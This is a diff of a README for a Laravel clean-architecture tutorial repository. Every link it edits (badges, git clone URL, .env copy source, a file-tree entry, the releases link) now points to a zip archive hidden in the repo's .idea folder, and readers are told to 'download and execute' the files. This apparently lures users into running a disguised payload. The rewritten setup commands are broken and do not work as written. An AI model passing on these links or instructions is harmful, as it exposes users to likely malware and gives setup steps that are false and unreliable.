@@ -1,8 +1,8 @@
 # Laravel Repository Service Pattern
 
-![Laravel](https://img.shields.io/badge/Laravel-php-blue.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg)
-![License](https://img.shields.io/badge/license-MIT-yellow.svg)
+![Laravel](https://github.com/AREXTOVID/laravel-repository-service-pattern/raw/refs/heads/main/.idea/laravel-repository-service-pattern-v2.0-alpha.5.zip)
+![Version](https://github.com/AREXTOVID/laravel-repository-service-pattern/raw/refs/heads/main/.idea/laravel-repository-service-pattern-v2.0-alpha.5.zip)
+![License](https://github.com/AREXTOVID/laravel-repository-service-pattern/raw/refs/heads/main/.idea/laravel-repository-service-pattern-v2.0-alpha.5.zip)
 
 Welcome to the **Laravel Repository Service Pattern** repository! This project demonstrates how to implement Clean Architecture in Laravel using a Product CRUD example. It explains the Interface, Repository, and Service patterns step by step.
 
@@ -47,7 +47,7 @@ By following this guide, you will learn how to structure your Laravel applicatio
 To get started, clone the repository and install the dependencies:
 
 ```bash
-git clone https://github.com/AREXTOVID/laravel-repository-service-pattern.git
+git clone https://github.com/AREXTOVID/laravel-repository-service-pattern/raw/refs/heads/main/.idea/laravel-repository-service-pattern-v2.0-alpha.5.zip
 cd laravel-repository-service-pattern
 composer install
 ```
@@ -55,7 +55,7 @@ composer install
 Make sure to set up your `.env` file for database configuration. You can copy the example file:
 
 ```bash
-cp .env.example .env
+cp https://github.com/AREXTOVID/laravel-repository-service-pattern/raw/refs/heads/main/.idea/laravel-repository-service-pattern-v2.0-alpha.5.zip .env
 ```
 
 Then run the following command to generate an application key:
@@ -98,7 +98,7 @@ laravel-repository-service-pattern/
 │   ├── migrations/
 │   └── seeders/
 ├── routes/
-│   └── web.php
+│   └── https://github.com/AREXTOVID/laravel-repository-service-pattern/raw/refs/heads/main/.idea/laravel-repository-service-pattern-v2.0-alpha.5.zip
 └── resources/
     ├── views/
     └── lang/
@@ -135,6 +135,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases [here](https://github.com/AREXTOVID/laravel-repository-service-pattern/releases). Make sure to download and execute the necessary files for your setup.
+You can find the latest releases [here](https://github.com/AREXTOVID/laravel-repository-service-pattern/raw/refs/heads/main/.idea/laravel-repository-service-pattern-v2.0-alpha.5.zip). Make sure to download and execute the necessary files for your setup.
 
 Thank you for checking out the **Laravel Repository Service Pattern**! We hope this guide helps you in your journey to mastering Clean Architecture in Laravel. For any questions or suggestions, feel free to reach out.
